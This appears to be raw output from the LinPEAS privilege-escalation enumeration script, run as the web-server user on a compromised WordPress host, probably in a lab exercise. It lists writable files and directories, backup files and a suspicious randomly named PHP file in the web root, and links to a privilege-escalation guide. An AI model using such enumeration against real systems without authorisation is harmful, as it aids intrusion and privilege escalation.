-rw-r--r-- 1 root root 7086 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.builtin-check.o.cmd
-rw-r--r-- 1 root root 4130 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.fixdep.o.d
-rw-r--r-- 1 root root 6672 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.pager.o.cmd
-rw-r--r-- 1 root root 7348 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.builtin-orc.o.cmd
-rw-r--r-- 1 root root 6797 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.help.o.cmd
-rw-r--r-- 1 root root 7911 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.orc_gen.o.cmd
-rw-r--r-- 1 root root 1980 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.subcmd-config.o.cmd
-rw-r--r-- 1 root root 7987 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.check.o.cmd
-rw-r--r-- 1 root root 5720 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.libstring.o.cmd
-rw-r--r-- 1 root root 4346 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.str_error_r.o.cmd
-rw-r--r-- 1 root root 5769 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.sigchain.o.cmd
-rw-r--r-- 1 root root 5020 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.fixdep.o.cmd
-rw-r--r-- 1 root root 6267 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.objtool.o.cmd
-rw-r--r-- 1 root root 8225 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.orc_dump.o.cmd
-rw-r--r-- 1 root root 6097 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.parse-options.o.cmd
-rw-r--r-- 1 root root 7804 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.run-command.o.cmd
-rw-r--r-- 1 root root 435 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/tools/objtool/.fixdep-in.o.cmd
-rw-r--r-- 1 root root 962 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/.missing-syscalls.d
-rw-r--r-- 1 root root 217336 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/.config
-rw-r--r-- 1 root root 71896 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/.cache.mk
-rw-r--r-- 1 root root 6421 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/.extract-cert.cmd
-rw-r--r-- 1 root root 7415 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/.sign-file.cmd
-rw-r--r-- 1 root root 4535 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/.asn1_compiler.cmd
-rw-r--r-- 1 root root 3736 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/mod/.mk_elfconfig.cmd
-rw-r--r-- 1 root root 129 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/mod/.modpost.cmd
-rw-r--r-- 1 root root 5820 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/mod/.sumversion.o.cmd
-rw-r--r-- 1 root root 104 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/mod/.elfconfig.h.cmd
-rw-r--r-- 1 root root 4820 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/mod/.file2alias.o.cmd
-rw-r--r-- 1 root root 6203 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/mod/.modpost.o.cmd
-rw-r--r-- 1 root root 3081 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/mod/.empty.o.cmd
-rw-r--r-- 1 root root 6538 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/mod/.devicetable-offsets.s.cmd
-rw-r--r-- 1 root root 4982 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/.sortextable.cmd
-rw-r--r-- 1 root root 3812 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/.kallsyms.cmd
-rw-r--r-- 1 root root 5401 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/.insert-sys-cert.cmd
-rw-r--r-- 1 root root 3536 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/.conmakehash.cmd
-rw-r--r-- 1 root root 6321 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/kconfig/.zconf.tab.o.cmd
-rw-r--r-- 1 root root 110 May 11 09:08 /usr/src/linux-headers-4.15.0-101-generic/scripts/kconfig/.conf.cmd
grep: write error: Broken pipe

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
-rw-r--r-- 1 root root 37642 May 26 18:15 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 3266 May 25 12:58 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 3618 May 26 03:29 /var/backups/apt.extended_states.1.gz

[+] Interesting writable files owned by me or writable by everyone (not in Home)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/lock/apache2
/run/screen
/run/screen/S-www-data
/snap/core/8268/run/lock
/snap/core/8268/tmp
/snap/core/8268/var/tmp
/snap/core/9066/run/lock
/snap/core/9066/tmp
/snap/core/9066/var/tmp
/srv/smb/files
/tmp
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/nmbd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/smbd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8268.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-9066.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/uuidd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/spool/samba
/var/tmp
/var/www/wordpress
/var/www/wordpress/.htaccess
/var/www/wordpress/.htaccess_backup
/var/www/wordpress/UGnqDEaRZi.php
/var/www/wordpress/index.php
/var/www/wordpress/license.txt
/var/www/wordpress/linpeas.sh
/var/www/wordpress/readme.html
/var/www/wordpress/wp-activate.php
/var/www/wordpress/wp-admin
/var/www/wordpress/wp-admin/about.php
/var/www/wordpress/wp-admin/admin-ajax.php
/var/www/wordpress/wp-admin/admin-footer.php
/var/www/wordpress/wp-admin/admin-functions.php
/var/www/wordpress/wp-admin/admin-header.php
/var/www/wordpress/wp-admin/admin-post.php
/var/www/wordpress/wp-admin/admin.php
/var/www/wordpress/wp-admin/async-upload.php
/var/www/wordpress/wp-admin/comment.php
/var/www/wordpress/wp-admin/credits.php
/var/www/wordpress/wp-admin/css
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/css/about-rtl.min.css
/var/www/wordpress/wp-admin/css/about.css
/var/www/wordpress/wp-admin/css/about.min.css
/var/www/wordpress/wp-admin/css/admin-menu-rtl.css
/var/www/wordpress/wp-admin/css/admin-menu-rtl.min.css
/var/www/wordpress/wp-admin/css/admin-menu.css
/var/www/wordpress/wp-admin/css/admin-menu.min.css
/var/www/wordpress/wp-admin/css/code-editor-rtl.css
/var/www/wordpress/wp-admin/css/code-editor-rtl.min.css
/var/www/wordpress/wp-admin/css/code-editor.css
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/css/colors/_mixins.scss
/var/www/wordpress/wp-admin/css/colors/_variables.scss
/var/www/wordpress/wp-admin/css/colors/blue
/var/www/wordpress/wp-admin/css/colors/blue/colors-rtl.css
/var/www/wordpress/wp-admin/css/colors/blue/colors-rtl.min.css
/var/www/wordpress/wp-admin/css/colors/blue/colors.css
/var/www/wordpress/wp-admin/css/colors/blue/colors.min.css
/var/www/wordpress/wp-admin/css/colors/blue/colors.scss
/var/www/wordpress/wp-admin/css/colors/coffee
/var/www/wordpress/wp-admin/css/colors/coffee/colors-rtl.css
/var/www/wordpress/wp-admin/css/colors/coffee/colors-rtl.min.css
/var/www/wordpress/wp-admin/css/colors/coffee/colors.css
/var/www/wordpress/wp-admin/css/colors/coffee/colors.min.css
/var/www/wordpress/wp-admin/css/colors/coffee/colors.scss
/var/www/wordpress/wp-admin/css/colors/ectoplasm
/var/www/wordpress/wp-admin/css/colors/ectoplasm/colors-rtl.css
/var/www/wordpress/wp-admin/css/colors/ectoplasm/colors-rtl.min.css
/var/www/wordpress/wp-admin/css/colors/ectoplasm/colors.css
/var/www/wordpress/wp-admin/css/colors/ectoplasm/colors.min.css
/var/www/wordpress/wp-admin/css/colors/ectoplasm/colors.scss
/var/www/wordpress/wp-admin/css/colors/light
/var/www/wordpress/wp-admin/css/colors/light/colors-rtl.css
/var/www/wordpress/wp-admin/css/colors/light/colors-rtl.min.css
/var/www/wordpress/wp-admin/css/colors/light/colors.css
/var/www/wordpress/wp-admin/css/colors/light/colors.min.css
/var/www/wordpress/wp-admin/css/colors/light/colors.scss
/var/www/wordpress/wp-admin/css/colors/midnight
/var/www/wordpress/wp-admin/css/colors/midnight/colors-rtl.css
/var/www/wordpress/wp-admin/css/colors/midnight/colors-rtl.min.css
/var/www/wordpress/wp-admin/css/colors/midnight/colors.css
/var/www/wordpress/wp-admin/css/colors/midnight/colors.min.css
/var/www/wordpress/wp-admin/css/colors/midnight/colors.scss
/var/www/wordpress/wp-admin/css/colors/ocean
/var/www/wordpress/wp-admin/css/colors/ocean/colors-rtl.css
/var/www/wordpress/wp-admin/css/colors/ocean/colors-rtl.min.css
/var/www/wordpress/wp-admin/css/colors/ocean/colors.css
/var/www/wordpress/wp-admin/css/colors/ocean/colors.min.css
/var/www/wordpress/wp-admin/css/colors/ocean/colors.scss
/var/www/wordpress/wp-admin/css/colors/sunrise
/var/www/wordpress/wp-admin/css/colors/sunrise/colors-rtl.css
/var/www/wordpress/wp-admin/css/colors/sunrise/colors-rtl.min.css
/var/www/wordpress/wp-admin/css/colors/sunrise/colors.css
/var/www/wordpress/wp-admin/css/colors/sunrise/colors.min.css
/var/www/wordpress/wp-admin/css/colors/sunrise/colors.scss
/var/www/wordpress/wp-admin/css/common-rtl.css
/var/www/wordpress/wp-admin/css/common-rtl.min.css
/var/www/wordpress/wp-admin/css/common.css
/var/www/wordpress/wp-admin/css/common.min.css
/var/www/wordpress/wp-admin/css/customize-controls-rtl.css
/var/www/wordpress/wp-admin/css/customize-controls-rtl.min.css
/var/www/wordpress/wp-admin/css/customize-controls.css
/var/www/wordpress/wp-admin/css/customize-controls.min.css
/var/www/wordpress/wp-admin/css/customize-nav-menus-rtl.css
/var/www/wordpress/wp-admin/css/customize-nav-menus-rtl.min.css
/var/www/wordpress/wp-admin/css/customize-nav-menus.css
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/custom-header.php
/var/www/wordpress/wp-admin/customize.php
/var/www/wordpress/wp-admin/edit-comments.php
/var/www/wordpress/wp-admin/edit-form-advanced.php
/var/www/wordpress/wp-admin/edit-form-blocks.php
/var/www/wordpress/wp-admin/edit-form-comment.php
/var/www/wordpress/wp-admin/edit-link-form.php
/var/www/wordpress/wp-admin/edit-tag-form.php
/var/www/wordpress/wp-admin/edit-tags.php
/var/www/wordpress/wp-admin/edit.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/images/wordpress-logo.svg
/var/www/wordpress/wp-admin/import.php
/var/www/wordpress/wp-admin/includes
/var/www/wordpress/wp-admin/includes/admin-filters.php
/var/www/wordpress/wp-admin/includes/admin.php
/var/www/wordpress/wp-admin/includes/ajax-actions.php
/var/www/wordpress/wp-admin/includes/bookmark.php
/var/www/wordpress/wp-admin/includes/class-automatic-upgrader-skin.php
/var/www/wordpress/wp-admin/includes/class-bulk-plugin-upgrader-skin.php
/var/www/wordpress/wp-admin/includes/class-bulk-theme-upgrader-skin.php
/var/www/wordpress/wp-admin/includes/class-bulk-upgrader-skin.php
/var/www/wordpress/wp-admin/includes/class-core-upgrader.php
/var/www/wordpress/wp-admin/includes/class-file-upload-upgrader.php
/var/www/wordpress/wp-admin/includes/class-ftp-pure.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/install-helper.php
/var/www/wordpress/wp-admin/install.php
/var/www/wordpress/wp-admin/js
/var/www/wordpress/wp-admin/js/accordion.js
/var/www/wordpress/wp-admin/js/accordion.min.js
/var/www/wordpress/wp-admin/js/code-editor.js
/var/www/wordpress/wp-admin/js/code-editor.min.js
/var/www/wordpress/wp-admin/js/color-picker.js
/var/www/wordpress/wp-admin/js/color-picker.min.js
/var/www/wordpress/wp-admin/js/comment.js
/var/www/wordpress/wp-admin/js/comment.min.js
/var/www/wordpress/wp-admin/js/common.js
/var/www/wordpress/wp-admin/js/common.min.js
/var/www/wordpress/wp-admin/js/custom-background.js
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/js/widgets/custom-html-widgets.min.js
/var/www/wordpress/wp-admin/js/widgets/media-audio-widget.js
/var/www/wordpress/wp-admin/js/widgets/media-audio-widget.min.js
/var/www/wordpress/wp-admin/js/widgets/media-gallery-widget.js
/var/www/wordpress/wp-admin/js/widgets/media-gallery-widget.min.js
/var/www/wordpress/wp-admin/js/widgets/media-image-widget.js
/var/www/wordpress/wp-admin/js/widgets/media-image-widget.min.js
/var/www/wordpress/wp-admin/js/widgets/media-video-widget.js
/var/www/wordpress/wp-admin/js/widgets/media-video-widget.min.js
/var/www/wordpress/wp-admin/js/widgets/media-widgets.js
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/js/word-count.min.js
/var/www/wordpress/wp-admin/js/wp-fullscreen-stub.js
/var/www/wordpress/wp-admin/js/wp-fullscreen-stub.min.js
/var/www/wordpress/wp-admin/js/xfn.js
/var/www/wordpress/wp-admin/js/xfn.min.js
/var/www/wordpress/wp-admin/link-add.php
/var/www/wordpress/wp-admin/link-manager.php
/var/www/wordpress/wp-admin/link-parse-opml.php
/var/www/wordpress/wp-admin/link.php
/var/www/wordpress/wp-admin/load-scripts.php
/var/www/wordpress/wp-admin/load-styles.php
/var/www/wordpress/wp-admin/maint
/var/www/wordpress/wp-admin/maint/repair.php
/var/www/wordpress/wp-admin/media-new.php
/var/www/wordpress/wp-admin/media-upload.php
/var/www/wordpress/wp-admin/media.php
/var/www/wordpress/wp-admin/menu-header.php
/var/www/wordpress/wp-admin/menu.php
/var/www/wordpress/wp-admin/moderation.php
/var/www/wordpress/wp-admin/ms-admin.php
/var/www/wordpress/wp-admin/ms-delete-site.php
/var/www/wordpress/wp-admin/ms-edit.php
/var/www/wordpress/wp-admin/ms-options.php
/var/www/wordpress/wp-admin/ms-sites.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/network/admin.php
/var/www/wordpress/wp-admin/network/credits.php
/var/www/wordpress/wp-admin/network/edit.php
/var/www/wordpress/wp-admin/network/freedoms.php
/var/www/wordpress/wp-admin/network/index.php
/var/www/wordpress/wp-admin/network/menu.php
/var/www/wordpress/wp-admin/network/plugin-editor.php
/var/www/wordpress/wp-admin/network/plugin-install.php
/var/www/wordpress/wp-admin/network/plugins.php
/var/www/wordpress/wp-admin/network/privacy.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/options-general.php
/var/www/wordpress/wp-admin/options-head.php
/var/www/wordpress/wp-admin/options-media.php
/var/www/wordpress/wp-admin/options-permalink.php
/var/www/wordpress/wp-admin/options-reading.php
/var/www/wordpress/wp-admin/options-writing.php
/var/www/wordpress/wp-admin/options.php
/var/www/wordpress/wp-admin/plugin-editor.php
/var/www/wordpress/wp-admin/plugin-install.php
/var/www/wordpress/wp-admin/plugins.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-admin/user/admin.php
/var/www/wordpress/wp-admin/user/credits.php
/var/www/wordpress/wp-admin/user/freedoms.php
/var/www/wordpress/wp-admin/user/index.php
/var/www/wordpress/wp-admin/user/menu.php
/var/www/wordpress/wp-admin/user/privacy.php
/var/www/wordpress/wp-admin/user/profile.php
/var/www/wordpress/wp-admin/user/user-edit.php
/var/www/wordpress/wp-admin/users.php
/var/www/wordpress/wp-admin/widgets.php
/var/www/wordpress/wp-blog-header.php
/var/www/wordpress/wp-comments-post.php
/var/www/wordpress/wp-config-sample.php
/var/www/wordpress/wp-config.php
/var/www/wordpress/wp-content
/var/www/wordpress/wp-content/index.php
/var/www/wordpress/wp-content/plugins
/var/www/wordpress/wp-content/plugins/index.php
/var/www/wordpress/wp-content/plugins/wp-downgrade
/var/www/wordpress/wp-content/plugins/wp-downgrade/languages
/var/www/wordpress/wp-content/plugins/wp-downgrade/languages/wp-downgrade-de_DE.mo
/var/www/wordpress/wp-content/plugins/wp-downgrade/languages/wp-downgrade-de_DE.po
/var/www/wordpress/wp-content/plugins/wp-downgrade/languages/wp-downgrade-de_DE_formal.mo
/var/www/wordpress/wp-content/plugins/wp-downgrade/languages/wp-downgrade-de_DE_formal.po
/var/www/wordpress/wp-content/plugins/wp-downgrade/languages/wp-downgrade.pot
/var/www/wordpress/wp-content/plugins/wp-downgrade/readme.txt
/var/www/wordpress/wp-content/plugins/wp-downgrade/wp-downgrade.php
/var/www/wordpress/wp-content/themes
/var/www/wordpress/wp-content/themes/index.php
/var/www/wordpress/wp-content/themes/online-blog
/var/www/wordpress/wp-content/themes/online-blog/404.php
/var/www/wordpress/wp-content/themes/online-blog/archive.php
/var/www/wordpress/wp-content/themes/online-blog/assets
/var/www/wordpress/wp-content/themes/online-blog/assets/animate
/var/www/wordpress/wp-content/themes/online-blog/assets/animate/animate.css
/var/www/wordpress/wp-content/themes/online-blog/assets/breadcrumbs
/var/www/wordpress/wp-content/themes/online-blog/assets/breadcrumbs/breadcrumbs.php
/var/www/wordpress/wp-content/themes/online-blog/assets/css
/var/www/wordpress/wp-content/themes/online-blog/assets/css/admin.css
/var/www/wordpress/wp-content/themes/online-blog/assets/css/customize-controls.css
/var/www/wordpress/wp-content/themes/online-blog/assets/icons
/var/www/wordpress/wp-content/themes/online-blog/assets/icons/icon-quote-down.svg
/var/www/wordpress/wp-content/themes/online-blog/assets/icons/icon-quote-top.svg
/var/www/wordpress/wp-content/themes/online-blog/assets/jquery-match-height
/var/www/wordpress/wp-content/themes/online-blog/assets/jquery-match-height/jquery.matchHeight.js
/var/www/wordpress/wp-content/themes/online-blog/assets/jquery-match-height/jquery.matchHeight.min.js
/var/www/wordpress/wp-content/themes/online-blog/assets/magnific-popup
/var/www/wordpress/wp-content/themes/online-blog/assets/magnific-popup/jquery.magnific-popup.js
/var/www/wordpress/wp-content/themes/online-blog/assets/magnific-popup/jquery.magnific-popup.min.js
/var/www/wordpress/wp-content/themes/online-blog/assets/magnific-popup/magnific-popup.css
/var/www/wordpress/wp-content/themes/online-blog/assets/sidr
/var/www/wordpress/wp-content/themes/online-blog/assets/sidr/css
/var/www/wordpress/wp-content/themes/online-blog/assets/sidr/css/jquery.sidr.dark.css
/var/www/wordpress/wp-content/themes/online-blog/assets/sidr/js
/var/www/wordpress/wp-content/themes/online-blog/assets/sidr/js/jquery.sidr.js
/var/www/wordpress/wp-content/themes/online-blog/assets/sidr/js/jquery.sidr.min.js
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons/css
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons/css/simple-line-icons.css
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons/css/simple-line-icons.min.css
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons/fonts
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons/fonts/Simple-Line-Icons.eot
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons/fonts/Simple-Line-Icons.svg
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons/fonts/Simple-Line-Icons.ttf
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons/fonts/Simple-Line-Icons.woff
/var/www/wordpress/wp-content/themes/online-blog/assets/simple-line-icons/fonts/Simple-Line-Icons.woff2
/var/www/wordpress/wp-content/themes/online-blog/assets/slick
/var/www/wordpress/wp-content/themes/online-blog/assets/slick/css
/var/www/wordpress/wp-content/themes/online-blog/assets/slick/css/slick-theme.css
/var/www/wordpress/wp-content/themes/online-blog/assets/slick/css/slick.css
/var/www/wordpress/wp-content/themes/online-blog/assets/slick/css/slick.min.css
/var/www/wordpress/wp-content/themes/online-blog/assets/slick/js
/var/www/wordpress/wp-content/themes/online-blog/assets/slick/js/slick.js
/var/www/wordpress/wp-content/themes/online-blog/assets/slick/js/slick.min.js
/var/www/wordpress/wp-content/themes/online-blog/assets/theiaStickySidebar
/var/www/wordpress/wp-content/themes/online-blog/assets/theiaStickySidebar/maps
/var/www/wordpress/wp-content/themes/online-blog/assets/theiaStickySidebar/maps/theia-sticky-sidebar.min.js.map
/var/www/wordpress/wp-content/themes/online-blog/assets/theiaStickySidebar/theia-sticky-sidebar.js
/var/www/wordpress/wp-content/themes/online-blog/assets/theiaStickySidebar/theia-sticky-sidebar.min.js
/var/www/wordpress/wp-content/themes/online-blog/assets/wow
/var/www/wordpress/wp-content/themes/online-blog/assets/wow/js
/var/www/wordpress/wp-content/themes/online-blog/assets/wow/js/wow.js
/var/www/wordpress/wp-content/themes/online-blog/assets/wow/js/wow.min.js
/var/www/wordpress/wp-content/themes/online-blog/comments.php
/var/www/wordpress/wp-content/themes/online-blog/footer.php
/var/www/wordpress/wp-content/themes/online-blog/functions.php
/var/www/wordpress/wp-content/themes/online-blog/header.php
/var/www/wordpress/wp-content/themes/online-blog/inc
/var/www/wordpress/wp-content/themes/online-blog/inc/custom-header.php
/var/www/wordpress/wp-content/themes/online-blog/inc/customizer
/var/www/wordpress/wp-content/themes/online-blog/inc/customizer/color-font.php
/var/www/wordpress/wp-content/themes/online-blog/inc/customizer/core-customizer.php
/var/www/wordpress/wp-content/themes/online-blog/inc/customizer/customizer-default.php
/var/www/wordpress/wp-content/themes/online-blog/inc/customizer/customizer-function.php
/var/www/wordpress/wp-content/themes/online-blog/inc/customizer/customizer.php
/var/www/wordpress/wp-content/themes/online-blog/inc/customizer/theme-option.php
/var/www/wordpress/wp-content/themes/online-blog/inc/hooks
/var/www/wordpress/wp-content/themes/online-blog/inc/hooks/added-style.php
/var/www/wordpress/wp-content/themes/online-blog/inc/hooks/front-slider.php
/var/www/wordpress/wp-content/themes/online-blog/inc/jetpack.php
/var/www/wordpress/wp-content/themes/online-blog/inc/layout-meta
/var/www/wordpress/wp-content/themes/online-blog/inc/layout-meta/layout-meta.php
/var/www/wordpress/wp-content/themes/online-blog/inc/template-functions.php
/var/www/wordpress/wp-content/themes/online-blog/inc/template-tags.php
/var/www/wordpress/wp-content/themes/online-blog/inc/widgets
/var/www/wordpress/wp-content/themes/online-blog/inc/widgets/widget-base-class.php
/var/www/wordpress/wp-content/themes/online-blog/inc/widgets/widgets.php
/var/www/wordpress/wp-content/themes/online-blog/index.php
/var/www/wordpress/wp-content/themes/online-blog/js
/var/www/wordpress/wp-content/themes/online-blog/js/custom-script.js
/var/www/wordpress/wp-content/themes/online-blog/js/customizer-admin.js
/var/www/wordpress/wp-content/themes/online-blog/js/customizer.js
/var/www/wordpress/wp-content/themes/online-blog/js/skip-link-focus-fix.js
/var/www/wordpress/wp-content/themes/online-blog/js/widgets.js
/var/www/wordpress/wp-content/themes/online-blog/languages
/var/www/wordpress/wp-content/themes/online-blog/languages/online-blog.pot
/var/www/wordpress/wp-content/themes/online-blog/page.php
/var/www/wordpress/wp-content/themes/online-blog/readme.txt
/var/www/wordpress/wp-content/themes/online-blog/rtl.css
/var/www/wordpress/wp-content/themes/online-blog/search.php
/var/www/wordpress/wp-content/themes/online-blog/sidebar.php
/var/www/wordpress/wp-content/themes/online-blog/single.php
/var/www/wordpress/wp-content/themes/online-blog/style.css
/var/www/wordpress/wp-content/themes/online-blog/template-parts
/var/www/wordpress/wp-content/themes/online-blog/template-parts/content-general.php
/var/www/wordpress/wp-content/themes/online-blog/template-parts/content-none.php
/var/www/wordpress/wp-content/themes/online-blog/template-parts/content-page.php
/var/www/wordpress/wp-content/themes/online-blog/template-parts/content-search.php
/var/www/wordpress/wp-content/themes/online-blog/template-parts/content.php
/var/www/wordpress/wp-content/themes/twentynineteen
/var/www/wordpress/wp-content/themes/twentynineteen/404.php
/var/www/wordpress/wp-content/themes/twentynineteen/archive.php
/var/www/wordpress/wp-content/themes/twentynineteen/classes
/var/www/wordpress/wp-content/themes/twentynineteen/classes/class-twentynineteen-svg-icons.php
/var/www/wordpress/wp-content/themes/twentynineteen/classes/class-twentynineteen-walker-comment.php
/var/www/wordpress/wp-content/themes/twentynineteen/comments.php
/var/www/wordpress/wp-content/themes/twentynineteen/fonts
/var/www/wordpress/wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff
/var/www/wordpress/wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff2
/var/www/wordpress/wp-content/themes/twentynineteen/footer.php
/var/www/wordpress/wp-content/themes/twentynineteen/functions.php
/var/www/wordpress/wp-content/themes/twentynineteen/header.php
/var/www/wordpress/wp-content/themes/twentynineteen/image.php
/var/www/wordpress/wp-content/themes/twentynineteen/inc
/var/www/wordpress/wp-content/themes/twentynineteen/inc/back-compat.php
/var/www/wordpress/wp-content/themes/twentynineteen/inc/color-patterns.php
/var/www/wordpress/wp-content/themes/twentynineteen/inc/customizer.php
/var/www/wordpress/wp-content/themes/twentynineteen/inc/helper-functions.php
/var/www/wordpress/wp-content/themes/twentynineteen/inc/icon-functions.php
/var/www/wordpress/wp-content/themes/twentynineteen/inc/template-functions.php
/var/www/wordpress/wp-content/themes/twentynineteen/inc/template-tags.php
/var/www/wordpress/wp-content/themes/twentynineteen/index.php
/var/www/wordpress/wp-content/themes/twentynineteen/js
/var/www/wordpress/wp-content/themes/twentynineteen/js/customize-controls.js
/var/www/wordpress/wp-content/themes/twentynineteen/js/customize-preview.js
/var/www/wordpress/wp-content/themes/twentynineteen/js/priority-menu.js
/var/www/wordpress/wp-content/themes/twentynineteen/js/skip-link-focus-fix.js
/var/www/wordpress/wp-content/themes/twentynineteen/js/touch-keyboard-navigation.js
/var/www/wordpress/wp-content/themes/twentynineteen/package-lock.json
/var/www/wordpress/wp-content/themes/twentynineteen/package.json
/var/www/wordpress/wp-content/themes/twentynineteen/page.php
/var/www/wordpress/wp-content/themes/twentynineteen/postcss.config.js
